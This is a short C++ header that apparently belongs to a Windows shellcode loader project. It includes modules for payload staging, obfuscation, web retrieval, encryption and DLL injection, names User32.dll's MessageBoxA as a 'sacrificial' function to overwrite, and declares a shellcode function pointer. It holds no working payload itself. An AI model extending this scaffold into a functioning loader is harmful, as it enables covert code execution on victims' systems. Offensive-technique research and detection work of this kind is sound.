#pragma once
#pragma comment(lib, "kernel32.lib")
#include "RegstryPayloadStaging.h"
#include "Obfuscation.h"
#include "WebRetrival.h"
#include "UserInput.h"
#include "SystemInteraction.h"
#include "ErrorHandlers.h"
#include "Printers.h"
#include "Win32FindDataArray.h"
#include "rsrcPayloadTest.h"
#include "Externals.h"
#include "Encryption.h"
#include  "dllinjection.h"

#define		SACRIFICIAL_DLL          "User32.dll"
#define		SACRIFICIAL_FUNC         "MessageBoxA"

typedef  VOID(WINAPI* fnShellCode)();